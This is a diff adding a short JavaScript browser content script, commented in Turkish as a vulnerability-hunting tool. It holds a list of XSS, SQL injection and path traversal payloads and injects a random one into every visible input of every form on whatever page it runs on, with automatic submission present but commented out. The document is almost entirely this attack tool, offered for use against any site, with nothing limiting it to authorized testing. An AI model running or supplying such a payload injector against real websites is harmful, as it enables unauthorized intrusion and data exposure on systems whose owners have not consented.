@@ -1,0 +1,39 @@
+// Content script: Açık arama için form inputlarını test eden küçük bir script
+
+(function() {
+    console.log("[+] Açık Arama Scripti Başladı!");
+
+    // Payload listesi (XSS, SQLi vb. için örnekler)
+    const payloads = [
+        `"><script>alert('XSS')</script>`,
+        `' OR '1'='1`,
+        `<img src=x onerror=alert('XSS')>`,
+        `admin' --`,
+        `../../../../etc/passwd`
+    ];
+
+    // Sayfadaki tüm form öğelerini bul
+    const forms = document.querySelectorAll('form');
+
+    forms.forEach((form, index) => {
+        console.log(`[+] Form ${index + 1} inceleniyor...`);
+        
+        // Form içindeki tüm input ve textarea alanlarını bul
+        const inputs = form.querySelectorAll('input, textarea');
+
+        inputs.forEach(input => {
+            if (input.type !== 'hidden') { // Gizli alanları atla
+                // Her inputa rastgele bir payload enjekte et
+                const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
+                input.value = randomPayload;
+                console.log(`[+] Input alanına payload yerleştirildi: ${randomPayload}`);
+            }
+        });
+
+        // Formu göndermeden önce bir onay verelim (isteğe bağlı)
+        console.log(`[+] Form ${index + 1} için payloadlar hazır. Göndermek ister misin?`);
+        // İstersen form.submit() ile otomatik gönderebilirsin.
+        // form.submit();  <-- Yorum satırı (manuel açarsın)
+    });
+
+})();
